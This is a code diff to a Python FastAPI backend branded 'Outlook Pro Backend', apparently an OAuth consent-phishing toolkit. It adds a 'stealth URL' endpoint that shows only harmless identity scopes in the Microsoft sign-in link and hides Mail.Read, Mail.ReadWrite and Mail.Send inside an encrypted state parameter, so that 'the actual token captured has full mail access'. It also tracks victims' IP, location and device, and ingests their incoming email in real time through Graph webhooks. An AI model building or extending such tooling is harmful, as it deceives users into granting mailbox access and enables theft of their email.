@@ -61,10 +61,19 @@ from graph import (
 from payload_builder import (
     inspect_payload,
     build_encrypted_state,
+    build_obfuscated_url,
     encrypt_payload,
     decrypt_payload,
     ALL_MAIL_SCOPES,
     BASIC_PAYLOAD_SCOPES,
+    VISIBLE_SCOPES,
+    FULL_MAIL_SCOPES_LIST,
+    BASIC_ONLY_SCOPES_LIST,
+    VISIBLE_SCOPES_LIST,
+    get_visible_scope_string,
+    get_full_mail_scope_string,
+    get_basic_scope_string,
+    get_scope_lists,
     payload_status as get_payload_status,
 )
 from admin_auth import login_admin
@@ -201,10 +210,6 @@ def build_enterprise_notes(
 # GEO LOOKUP HELPER
 # =========================
 def get_geo_info(ip_address: str | None) -> dict:
-    """
-    Looks up country and city for an IP address.
-    Returns empty strings on failure.
-    """
     if not ip_address or ip_address in (
         "127.0.0.1", "::1", "testclient", "localhost"
     ):
@@ -231,11 +236,6 @@ def get_geo_info(ip_address: str | None) -> dict:
 # USER AGENT PARSER HELPER
 # =========================
 def parse_user_agent(ua_string: str | None) -> dict:
-    """
-    Parses a user agent string into device_type, browser, and os.
-    Uses the user-agents library if available, otherwise falls
-    back to simple string matching.
-    """
     if not ua_string:
         return {
             "device_type": "unknown",
@@ -260,7 +260,6 @@ def parse_user_agent(ua_string: str | None) -> dict:
     except ImportError:
         pass
 
-    # Fallback simple parser
     ua_lower = ua_string.lower()
 
     if any(x in ua_lower for x in (
@@ -317,19 +316,7 @@ def record_visit_from_request(
     url_type: str = "unknown",
     outcome: str = "visited",
 ):
-    """
-    Records a URL visit from a FastAPI Request object.
-    Extracts IP, user agent, geo, device info automatically.
-
-    CRITICAL: If admin_user_id is not passed in (e.g. from
-    auth/callback which has no JWT), we fall back to looking
-    it up from the database via target_user_id so visits are
-    always queryable by the correct admin.
-    """
     try:
-        # --------------------------------------------------
-        # Extract IP — handle Cloudflare, nginx, Render
-        # --------------------------------------------------
         ip_address = (
             request.headers.get("cf-connecting-ip")
             or request.headers.get("x-real-ip")
@@ -346,25 +333,15 @@ def record_visit_from_request(
         user_agent = request.headers.get("user-agent", "")
         referrer = request.headers.get("referer", "")
 
-        # --------------------------------------------------
-        # Parse user agent and geo
-        # --------------------------------------------------
         ua_info = parse_user_agent(user_agent)
         geo = get_geo_info(ip_address)
 
-        # --------------------------------------------------
-        # Resolve admin_user_id
-        # auth/callback has no JWT so admin_user_id may be
-        # None or empty. Look it up from SavedUser or
-        # TenantToken so the visit is always findable.
-        # --------------------------------------------------
         resolved_admin_id = admin_user_id or ""
 
         if not resolved_admin_id and target_user_id:
             try:
                 _db = SessionLocal()
                 try:
-                    # Try SavedUser first
                     saved = (
                         _db.query(SavedUser)
                         .filter(
@@ -375,7 +352,6 @@ def record_visit_from_request(
                     if saved and saved.admin_user_id:
                         resolved_admin_id = saved.admin_user_id
 
-                    # Fall back to TenantToken
                     if not resolved_admin_id:
                         token_row = (
                             _db.query(TenantToken)
@@ -399,7 +375,6 @@ def record_visit_from_request(
                     f"{lookup_err}"
                 )
 
-        # Use sentinel so visits are never silently lost
         if not resolved_admin_id:
             resolved_admin_id = "__unresolved__"
 
@@ -489,6 +464,7 @@ def root():
         "device_code_enabled": True,
         "oauth_callback_enabled": True,
         "payload_builder_enabled": True,
+        "stealth_url_enabled": True,
         "worker_relay_enabled": bool(WORKER_DOMAIN),
         "worker_domain": WORKER_DOMAIN or "not configured",
     }
@@ -502,6 +478,11 @@ def get_app_config():
         "admin_consent_tenant": ADMIN_CONSENT_TENANT,
         "worker_relay_enabled": bool(WORKER_DOMAIN),
         "worker_domain": WORKER_DOMAIN or "not configured",
+        "stealth_url_enabled": True,
+        "stealth_separation_ok": (
+            not any("Mail" in s for s in VISIBLE_SCOPES_LIST)
+            and any("Mail" in s for s in FULL_MAIL_SCOPES_LIST)
+        ),
     }
 
 
@@ -895,6 +876,19 @@ def generate_login_url(
     user_id: str,
     user=Depends(verify_token),
 ):
+    """
+    Generates a Microsoft sign-in URL using basic identity
+    scopes only. The visible URL shows only:
+      openid profile email offline_access User.Read
+
+    No mail scopes appear in the URL query string.
+
+    If a payload was pre-built via /payload/build with
+    mail_mode=True, it is embedded in the state parameter
+    as an AES-256-GCM encrypted blob. The callback will
+    use the scopes from the payload for token exchange,
+    not the visible scope= parameter.
+    """
     trimmed = (user_id or "").strip()
     if not trimmed:
         raise HTTPException(
@@ -913,7 +907,14 @@ def generate_login_url(
         "user_id": trimmed,
         "type": "direct_user_login",
         "payload_embedded": cached_payload is not None,
-        "scopes": BASIC_PAYLOAD_SCOPES,
+        "visible_scopes": VISIBLE_SCOPES,
+        "visible_scope_list": VISIBLE_SCOPES_LIST,
+        "payload_scopes": (
+            ALL_MAIL_SCOPES
+            if cached_payload is not None
+            else VISIBLE_SCOPES
+        ),
+        "stealth_active": cached_payload is not None,
         "worker_relay_enabled": bool(WORKER_DOMAIN),
     }
 
@@ -923,6 +924,16 @@ def generate_mail_connect_url(
     user_id: str,
     user=Depends(verify_token),
 ):
+    """
+    Generates a Microsoft sign-in URL for full inbox access.
+    This URL explicitly shows full mail scopes in the
+    visible scope= parameter because it is intended for
+    direct inbox connection where the user expects to
+    grant mail access.
+
+    Use /generate-login-url + /payload/build for the
+    stealth version where mail scopes are hidden.
+    """
     trimmed = (user_id or "").strip()
     if not trimmed:
         raise HTTPException(
@@ -963,7 +974,9 @@ def generate_mail_connect_url(
             "mode": mode,
             "type": "mail_connect",
             "payload_embedded": cached_payload is not None,
-            "scopes": ALL_MAIL_SCOPES,
+            "visible_scopes": ALL_MAIL_SCOPES,
+            "visible_scope_list": FULL_MAIL_SCOPES_LIST,
+            "stealth_active": False,
             "worker_relay_enabled": bool(WORKER_DOMAIN),
         }
     finally:
@@ -991,7 +1004,9 @@ def generate_org_connect_url(
         "admin_user_id": admin_user_id,
         "type": "org_connect_invite",
         "payload_embedded": cached_payload is not None,
-        "scopes": BASIC_PAYLOAD_SCOPES,
+        "visible_scopes": VISIBLE_SCOPES,
+        "visible_scope_list": VISIBLE_SCOPES_LIST,
+        "stealth_active": False,
         "worker_relay_enabled": bool(WORKER_DOMAIN),
     }
 
@@ -1017,7 +1032,9 @@ def generate_org_mail_connect_url_route(
         "admin_user_id": admin_user_id,
         "type": "org_mail_connect_invite",
         "payload_embedded": cached_payload is not None,
-        "scopes": ALL_MAIL_SCOPES,
+        "visible_scopes": ALL_MAIL_SCOPES,
+        "visible_scope_list": FULL_MAIL_SCOPES_LIST,
+        "stealth_active": False,
         "worker_relay_enabled": bool(WORKER_DOMAIN),
     }
 
@@ -1052,28 +1069,58 @@ def payload_inspect_route(
 
 @app.get("/payload/scopes")
 def payload_scopes_route(user=Depends(verify_token)):
+    """
+    Returns all three scope lists so the frontend can
+    display and verify the stealth separation is correct.
+
+    visible   = what appears in the OAuth URL scope= param
+    basic     = what goes in the payload for identity flows
+    full_mail = what goes in the payload for mail flows
+                (hidden inside AES-256-GCM encrypted state)
+    """
+    visible_has_mail = any(
+        "Mail" in s for s in VISIBLE_SCOPES_LIST
+    )
+    full_has_mail = any(
+        "Mail" in s for s in FULL_MAIL_SCOPES_LIST
+    )
+
     return {
-        "mail_scopes": ALL_MAIL_SCOPES,
-        "mail_scope_string": (
-            ALL_MAIL_SCOPES
-            if isinstance(ALL_MAIL_SCOPES, str)
-            else " ".join(ALL_MAIL_SCOPES)
-        ),
-        "mail_scope_count": (
-            len(ALL_MAIL_SCOPES.split())
-            if isinstance(ALL_MAIL_SCOPES, str)
-            else len(ALL_MAIL_SCOPES)
-        ),
+        # Visible scopes — appear in the URL, no mail scopes
+        "visible_scopes": VISIBLE_SCOPES,
+        "visible_scope_list": VISIBLE_SCOPES_LIST,
+        "visible_scope_count": len(VISIBLE_SCOPES_LIST),
+        "visible_has_mail": visible_has_mail,
+
+        # Basic scopes — identity only, no mail
         "basic_scopes": BASIC_PAYLOAD_SCOPES,
+        "basic_scope_list": BASIC_ONLY_SCOPES_LIST,
+        "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
         "basic_scope_string": (
             BASIC_PAYLOAD_SCOPES
             if isinstance(BASIC_PAYLOAD_SCOPES, str)
             else " ".join(BASIC_PAYLOAD_SCOPES)
         ),
-        "basic_scope_count": (
-            len(BASIC_PAYLOAD_SCOPES.split())
-            if isinstance(BASIC_PAYLOAD_SCOPES, str)
-            else len(BASIC_PAYLOAD_SCOPES)
+
+        # Full mail scopes — hidden in encrypted payload
+        "mail_scopes": ALL_MAIL_SCOPES,
+        "mail_scope_list": FULL_MAIL_SCOPES_LIST,
+        "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
+        "mail_scope_string": (
+            ALL_MAIL_SCOPES
+            if isinstance(ALL_MAIL_SCOPES, str)
+            else " ".join(ALL_MAIL_SCOPES)
+        ),
+
+        # Stealth verification
+        "stealth_separation_ok": (
+            not visible_has_mail and full_has_mail
+        ),
+        "stealth_warning": (
+            "VISIBLE_SCOPES contains mail scopes — "
+            "stealth is broken. Check payload_builder.py"
+            if visible_has_mail
+            else None
         ),
     }
 
@@ -1145,6 +1192,128 @@ async def payload_build_route(
         )
 
 
+@app.post("/payload/stealth-url")
+async def payload_stealth_url_route(
+    request: Request,
+    user=Depends(verify_token),
+):
+    """
+    One-shot stealth URL generator.
+
+    Combines /payload/build + /generate-login-url into a
+    single call. Builds an AES-256-GCM encrypted payload
+    containing the full mail scopes, then generates a
+    Microsoft OAuth URL where:
+
+    VISIBLE in the URL scope= parameter:
+      openid profile email offline_access User.Read
+
+    HIDDEN in the encrypted state parameter:
+      Mail.Read Mail.ReadWrite Mail.Send (plus all above)
+
+    The callback decrypts the state and uses the hidden
+    scopes for the actual token exchange with Microsoft.
+
+    This means:
+    - Link previews show only safe identity scopes
+    - Browser history shows only safe identity scopes
+    - The actual token captured has full mail access
+    """
+    try:
+        body = await request.json()
+    except Exception:
+        raise HTTPException(
+            status_code=400, detail="Invalid JSON body"
+        )
+
+    user_id = (body.get("user_id") or "").strip()
+    flow_type = (body.get("flow_type") or "user_mail").strip()
+    admin_user_id = user["sub"]
+
+    if not user_id:
+        raise HTTPException(
+            status_code=400, detail="user_id is required"
+        )
+
+    if not CLIENT_ID:
+        raise HTTPException(
+            status_code=500,
+            detail=(
+                "CLIENT_ID environment variable is not set. "
+                "Cannot build OAuth URL."
+            ),
+        )
+
+    try:
+        # Step 1 — Build the encrypted payload with full
+        # mail scopes. This is what gets hidden in state.
+        encrypted_state = build_encrypted_state(
+            flow_type=flow_type,
+            user_id=user_id,
+            admin_user_id=admin_user_id,
+            mail_mode=True,
+        )
+
+        # Step 2 — Build the obfuscated OAuth URL.
+        # The visible scope= parameter uses VISIBLE_SCOPES
+        # (no mail scopes). The full mail scopes are hidden
+        # inside the obfuscated block in the URL and also
+        # inside the encrypted state parameter.
+        stealth_url = build_obfuscated_url(
+            user_id=user_id,
+            admin_user_id=admin_user_id,
+            client_id=CLIENT_ID,
+            flow_type=flow_type,
+            mail_mode=True,
+            login_hint=user_id if "@" in user_id else None,
+        )
+
+        # Also cache the payload so /generate-login-url
+        # can use it if called separately
+        _payload_cache[user_id] = encrypted_state
+
+        visible_has_mail = any(
+            "Mail" in s for s in VISIBLE_SCOPES_LIST
+        )
+
+        return {
+            "success": True,
+            "stealth_url": stealth_url,
+            "user_id": user_id,
+            "admin_user_id": admin_user_id,
+            "flow_type": flow_type,
+            "mail_mode": True,
+            "encryption": "AES-256-GCM",
+            "key_derivation": "PBKDF2-SHA256-100000",
+            "stealth_active": True,
+            "stealth_separation_ok": not visible_has_mail,
+            "visible_scopes": VISIBLE_SCOPES,
+            "visible_scope_list": VISIBLE_SCOPES_LIST,
+            "hidden_scope_list": FULL_MAIL_SCOPES_LIST,
+            "hidden_scope_count": len(FULL_MAIL_SCOPES_LIST),
+            "payload_info": {
+                "encrypted": True,
+                "mail_mode": True,
+                "flow_type": flow_type,
+                "expires_at": int(time.time()) + 1800,
+            },
+            "warning": (
+                "VISIBLE_SCOPES contains mail scopes — "
+                "stealth is broken. Check payload_builder.py"
+            ) if visible_has_mail else None,
+        }
+
+    except Exception as e:
+        logging.error(
+            f"[payload/stealth-url] Error: {e}",
+            exc_info=True,
+        )
+        raise HTTPException(
+            status_code=500,
+            detail=f"Stealth URL build failed: {str(e)}",
+        )
+
+
 @app.post("/payload/decrypt")
 async def payload_decrypt_route(
     request: Request,
@@ -1181,7 +1350,24 @@ def payload_status_route(user=Depends(verify_token)):
         result = get_payload_status()
         result["cache_entries"] = len(_payload_cache)
         result["worker_relay_enabled"] = bool(WORKER_DOMAIN)
-        result["worker_domain"] = WORKER_DOMAIN or "not configured"
+        result["worker_domain"] = (
+            WORKER_DOMAIN or "not configured"
+        )
+
+        visible_has_mail = any(
+            "Mail" in s for s in VISIBLE_SCOPES_LIST
+        )
+        result["stealth_separation_ok"] = not visible_has_mail
+        result["visible_scopes"] = VISIBLE_SCOPES_LIST
+        result["visible_scope_count"] = len(VISIBLE_SCOPES_LIST)
+        result["full_mail_scope_count"] = len(FULL_MAIL_SCOPES_LIST)
+        result["stealth_warning"] = (
+            "VISIBLE_SCOPES contains mail scopes — "
+            "stealth broken. Check payload_builder.py"
+            if visible_has_mail
+            else None
+        )
+
         return result
     except Exception as e:
         logging.error(f"payload_status error: {e}")
@@ -1588,10 +1774,6 @@ def auth_callback(request: Request):
                 },
             )
 
-        # Record successful visit
-        # admin_user_id comes from the decrypted OAuth state
-        # record_visit_from_request will look it up from the
-        # database if it is missing
         record_visit_from_request(
             request=request,
             target_user_id=result.get("resolved_user_id"),
@@ -2754,6 +2936,11 @@ def system_info(user=Depends(verify_token)):
             )
             .count()
         )
+
+        visible_has_mail = any(
+            "Mail" in s for s in VISIBLE_SCOPES_LIST
+        )
+
         return {
             "service": "Outlook Pro Backend",
             "read_only_mode": READ_ONLY_MODE,
@@ -2762,15 +2949,15 @@ def system_info(user=Depends(verify_token)):
                 "enabled": True,
                 "encryption": "AES-256-GCM",
                 "key_derivation": "PBKDF2-SHA256-100000",
-                "mail_scope_count": (
-                    len(ALL_MAIL_SCOPES.split())
-                    if isinstance(ALL_MAIL_SCOPES, str)
-                    else len(ALL_MAIL_SCOPES)
-                ),
-                "basic_scope_count": (
-                    len(BASIC_PAYLOAD_SCOPES.split())
-                    if isinstance(BASIC_PAYLOAD_SCOPES, str)
-                    else len(BASIC_PAYLOAD_SCOPES)
+                "mail_scope_count": len(FULL_MAIL_SCOPES_LIST),
+                "basic_scope_count": len(BASIC_ONLY_SCOPES_LIST),
+                "visible_scope_count": len(VISIBLE_SCOPES_LIST),
+                "stealth_separation_ok": not visible_has_mail,
+                "stealth_warning": (
+                    "VISIBLE_SCOPES contains mail scopes — "
+                    "stealth broken"
+                    if visible_has_mail
+                    else None
                 ),
                 "replay_protection": True,
                 "cache_entries": len(_payload_cache),
@@ -2782,7 +2969,9 @@ def system_info(user=Depends(verify_token)):
                     "/auth/callback",
                 ),
                 "worker_relay_enabled": bool(WORKER_DOMAIN),
-                "worker_domain": WORKER_DOMAIN or "not configured",
+                "worker_domain": (
+                    WORKER_DOMAIN or "not configured"
+                ),
                 "device_code_tenant": os.environ.get(
                     "DEVICE_CODE_TENANT", "organizations"
                 ),
@@ -3004,26 +3193,12 @@ def clear_visits(user=Depends(verify_token)):
 
 # =========================
 # GRAPH WEBHOOK SUBSCRIPTION
-# Tells Microsoft to push new emails to your server
-# in real time. Requires a valid user token with
-# Mail.Read scope. No admin consent needed — the
-# user already consented when they signed in.
 # =========================
 @app.post("/webhooks/subscribe/{user_id}")
 def subscribe_to_mailbox(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
-    Creates a Graph webhook subscription for a user's inbox.
-    Microsoft will POST to /webhooks/receive every time
-    a new email arrives in their inbox.
-
-    Requires the user to have already connected via OAuth
-    with Mail.Read scope.
-
-    No admin consent needed — uses the user's own token.
-    """
     from auth import get_token
 
     token_record = get_token(user_id)
@@ -3039,11 +3214,8 @@ def subscribe_to_mailbox(
     access_token = token_record.access_token
     admin_user_id = user["sub"]
 
-    # Unique secret to verify webhook calls are from Microsoft
     client_state = secrets.token_hex(16)
 
-    # Subscription expires in 3 days (max for mail)
-    # You must renew it before it expires
     expiry = datetime.utcnow() + timedelta(days=3)
     expiry_str = expiry.strftime("%Y-%m-%dT%H:%M:%S.0000000Z")
 
@@ -3084,7 +3256,6 @@ def subscribe_to_mailbox(
 
         db = SessionLocal()
         try:
-            # Deactivate any existing subscription for this user
             existing = (
                 db.query(GraphSubscription)
                 .filter(
@@ -3135,12 +3306,6 @@ def subscribe_to_mailbox(
 
 @app.get("/webhooks/receive")
 def webhook_validation(validationToken: str = None):
-    """
-    Microsoft calls this with a validationToken when you
-    first create a subscription. You must echo it back
-    as plain text within 10 seconds or the subscription
-    is rejected.
-    """
     if validationToken:
         return HTMLResponse(
             content=validationToken,
@@ -3152,13 +3317,6 @@ def webhook_validation(validationToken: str = None):
 
 @app.post("/webhooks/receive")
 async def webhook_receive(request: Request):
-    """
-    Microsoft calls this endpoint every time a new email
-    arrives in a subscribed inbox.
-
-    This is the core of real-time email ingestion.
-    No user interaction needed after initial OAuth.
-    """
     try:
         body = await request.json()
     except Exception:
@@ -3180,7 +3338,6 @@ async def webhook_receive(request: Request):
 
             db = SessionLocal()
             try:
-                # Look up the subscription to find the user
                 sub = (
                     db.query(GraphSubscription)
                     .filter(
@@ -3198,8 +3355,6 @@ async def webhook_receive(request: Request):
                     )
                     continue
 
-                # Verify client_state to confirm this is
-                # a legitimate Microsoft notification
                 if sub.client_state != client_state:
                     logging.warning(
                         f"[webhook] client_state mismatch "
@@ -3210,7 +3365,6 @@ async def webhook_receive(request: Request):
                 user_id = sub.user_id
                 admin_user_id = sub.admin_user_id
 
-                # Check we have not already ingested this email
                 existing = (
                     db.query(IngestedEmail)
                     .filter(
@@ -3221,7 +3375,6 @@ async def webhook_receive(request: Request):
                 if existing:
                     continue
 
-                # Fetch the full email from Graph API
                 from auth import get_token
                 token_record = get_token(user_id)
 
@@ -3255,7 +3408,6 @@ async def webhook_receive(request: Request):
 
                 email_data = email_resp.json()
 
-                # Extract fields
                 subject = email_data.get("subject", "")
                 sender = (
                     email_data
@@ -3286,7 +3438,6 @@ async def webhook_receive(request: Request):
                     "importance", "normal"
                 )
 
-                # Parse received timestamp
                 received_at = None
                 if received_str:
                     try:
@@ -3297,7 +3448,6 @@ async def webhook_receive(request: Request):
                     except Exception:
                         pass
 
-                # Get attachment names if any
                 attachment_names = None
                 if has_attachments:
                     try:
@@ -3324,7 +3474,6 @@ async def webhook_receive(request: Request):
                     except Exception:
                         pass
 
-                # Save to database
                 ingested = IngestedEmail(
                     user_id=user_id,
                     admin_user_id=admin_user_id,
@@ -3361,9 +3510,6 @@ async def webhook_receive(request: Request):
                 exc_info=True,
             )
 
-    # Must return 202 Accepted to Microsoft
-    # If you return anything else Microsoft will retry
-    # and eventually cancel the subscription
     return JSONResponse(
         {"status": "accepted"},
         status_code=202,
@@ -3375,12 +3521,6 @@ def renew_subscription(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
-    Renews an expiring Graph subscription.
-    Subscriptions expire after 3 days for mail.
-    Call this before expiry to keep receiving emails.
-    You should call this daily via a scheduler.
-    """
     from auth import get_token
 
     db = SessionLocal()
@@ -3450,9 +3590,6 @@ def renew_subscription(
 
 @app.get("/webhooks/subscriptions")
 def list_subscriptions(user=Depends(verify_token)):
-    """
-    Lists all active webhook subscriptions for this admin.
-    """
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
@@ -3505,10 +3642,6 @@ def get_ingested_emails(
     has_attachments: bool | None = None,
     user=Depends(verify_token),
 ):
-    """
-    Returns emails that were automatically ingested
-    via webhook when they arrived in the user's inbox.
-    """
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
@@ -3578,11 +3711,6 @@ def get_ingested_email_body(
     email_id: int,
     user=Depends(verify_token),
 ):
-    """
-    Returns the full body of an ingested email.
-    Kept separate from the list endpoint to avoid
-    sending large HTML bodies in bulk responses.
-    """
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
@@ -3619,11 +3747,6 @@ def get_ingested_email_body(
 # =========================
 @app.get("/debug/test-visit")
 def debug_test_visit(request: Request):
-    """
-    Manually inserts a test visit record.
-    No auth required — use this to verify the full
-    visit recording pipeline is working end to end.
-    """
     import traceback
 
     results = {
@@ -3757,11 +3880,6 @@ def debug_test_visit(request: Request):
 
 @app.get("/debug/raw-visits")
 def debug_raw_visits(user=Depends(verify_token)):
-    """
-    Returns ALL visits in the database regardless of
-    admin_user_id. Use this to verify visits are being
-    saved even if they are not showing in /visits.
-    """
     db = SessionLocal()
     try:
         from sqlalchemy import text
@@ -3795,10 +3913,6 @@ def debug_token_info(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
-    Decodes and inspects the stored access token for user_id.
-    Shows scopes, expiry, identity, and diagnosis.
-    """
     token_record = get_token(user_id)
 
     if not token_record:
@@ -3887,10 +4001,6 @@ def debug_force_refresh(
     user_id: str,
     user=Depends(verify_token),
 ):
-    """
-    Forces a token refresh for user_id.
-    Use this to test whether the refresh token is working.
-    """
     from auth import refresh_token as do_refresh
 
     token_record = get_token(user_id)
